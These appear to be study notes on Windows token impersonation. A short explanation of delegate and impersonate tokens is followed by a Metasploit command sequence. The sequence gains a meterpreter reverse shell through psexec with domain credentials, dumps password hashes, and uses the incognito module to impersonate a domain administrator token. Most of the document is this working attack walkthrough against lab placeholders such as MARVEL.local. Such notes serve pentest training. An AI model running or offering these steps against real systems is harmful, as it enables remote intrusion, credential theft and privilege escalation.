Temporary tokens that allow you to access a network or computer without having to provide user credentials each time you have to access a file. Think of cookies for computers

+ Delegate Tokens - Created for logging to a machine or RDP
+ Impersonate - Non Interactive such as attaching network drive or domain logon script

## metasploit
```sh
> use exploit/windows/smb/psexec
> show options
> set rhosts <Victim host IP Address>
> set smbdomain <domain.local: MARVEL.local>
> set smbpass <password: Password1>
> set smbuser <username:fcastle>
> show targets
> set target 2 (native upload)
> show options
> # verify everything
> set payload windows/x64/meterpreter/reverse_tcp
> show options
> set lhost <Listener IP: eth0>
> run

# meterpreter session popped 

> hashdump
> whoami
> getuid
> load (tab tab)
> # you will see many options like mimikatz kiwi incognito etc
> load incognito
> help
# to list all the user token available
> list_tokens -u
# after analysing the output, select a user which is logged in to system
> impersonate_token <domainname//username: marvel//administrator>
# use \\ as character escaping
# now we have impersonated the administrator
> whoami
> getuid
> hashdump #wont work cos of impersonation, only work in as original/logged in user
# To get back to old self
> rev2self
> hashdump # now it will work

```

### Reference: https://www.offensive-security.com/metasploit-unleashed/fun-incognito/